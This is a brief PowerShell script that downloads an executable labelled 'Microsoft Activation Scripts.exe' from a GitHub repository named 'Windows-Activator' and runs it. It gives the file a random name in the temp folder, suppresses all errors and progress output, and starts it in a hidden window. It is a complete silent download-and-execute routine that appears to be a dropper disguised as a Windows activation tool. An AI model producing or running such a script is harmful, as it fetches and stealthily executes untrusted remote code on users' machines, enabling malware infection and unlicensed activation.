$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\app_$([System.Guid]::NewGuid().ToString('N')).exe"

Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null


if (-not (Test-Path $tempFile)) {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $tempFile)
    $webClient.Dispose()
}


if (Test-Path $tempFile) {
    Start-Process $tempFile -WindowStyle Hidden -ErrorAction SilentlyContinue
}
